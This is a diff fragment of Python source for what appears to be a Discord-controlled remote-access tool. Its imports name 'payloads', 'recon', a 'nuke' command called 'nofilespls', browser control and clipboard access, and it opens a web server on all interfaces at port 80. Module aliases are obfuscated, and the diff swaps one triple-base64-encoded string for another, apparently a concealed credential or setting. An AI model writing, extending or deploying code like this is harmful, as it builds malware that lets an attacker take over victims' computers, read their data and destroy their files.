@@ -16,7 +16,7 @@ import pyperclip
 from discord.ext import commands as YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw
 from threading import Thread
 import base64 as FJIURFIUJIUJFUJFF
-from start.launch import run, sendtokeembed
+from start.launch import run
 from payloads.recovery import recon, recoff
 from commands.nuke import nofilespls
 from commands.browser import search, openurl
@@ -61,7 +61,7 @@ app = Flask(__name__)
 def start_server():
     http_server = WSGIServer(("0.0.0.0", 80), app)
     http_server.serve_forever()
-ggs=base64.b64decode(base64.b64decode(base64.b64decode("""WkVjNWNscFhORDA9""")))
+ggs=base64.b64decode(base64.b64decode(base64.b64decode("""VkZaU1RtVnJOVlZTVkVaUFVrVnJNRlJXVW1wTlJURkZXbnBXVDFKRmEzZFVNVVYxVWpGd1ZsbFhSbXRNYWtsMFZESXhWVTVyUmxkbFYxWXlaREI0U1dGdFJsbGtiR00xVFhwSk5HVkZlRzlUUjNoR1RXc3hORmRFVW1sV1YyaFc=""")))
 @app.route('/')
 def index():
     return home()    
